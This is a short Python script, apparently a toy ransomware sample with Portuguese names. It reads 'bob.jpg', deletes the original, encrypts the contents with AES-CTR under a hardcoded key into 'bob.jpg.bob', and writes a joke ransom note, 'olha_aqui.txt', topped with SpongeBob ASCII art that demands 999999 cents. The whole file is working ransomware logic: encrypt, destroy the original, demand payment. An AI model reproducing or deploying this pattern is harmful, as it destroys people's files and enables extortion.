import os
import binascii
import pyaes


arquivo= "bob.jpg"
novo_arquivo=arquivo + ".bob"
key = b"sadftgbsdftghjut"



file = open(arquivo,"rb")
file_data=file.read()
file.close()
os.remove(arquivo)



aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
crypto_data_hex = binascii.hexlify(crypto_data)



new_file = open(novo_arquivo,"wb")
new_file.write(crypto_data)
new_file.close()



texto = b"voce foi atacado pelo bob esponja \npague 999999 centavos para ter seus arquivos\n"
arte=b'''
      .--..--..--..--..--..--.
    .' \\  (`._   (_)     _     .'
  \\ _.')\\      .----..---.   /
  |(_.'  |    /    .-\\-.  \\  |
  \\     0|    |   ( O| O) | o|
   |  _  |  .--.____.'._.-.  |
   \\ (_) | o         -` .-`  |
    |    \\   |`-._ _ _ _ _\ /
    \\    |   |  `. |_||_|   |
    | o  |    \\_      \\     |     -.   .-.
    |.-.  \\     `--..-'   O |     `.`-' .'
  _.'  .' |     `-.-'      /-.__   ' .-'
.' `-.` '.|='=.='=.='=.='=|._/_ `-'.'
`-._  `.  |________/\\_____|    `-.'
   .'   ).| '=' '='\\/ '=' |
   `._.`  '---------------'
           //___\\   //___  
    BOB      ||_.-.   ||_.-.
            (_.--__) (_.--__)
'''
texto+=arte
arquivo_texto = open("olha_aqui.txt","wb")
arquivo_texto.write(texto)
arquivo_texto.close()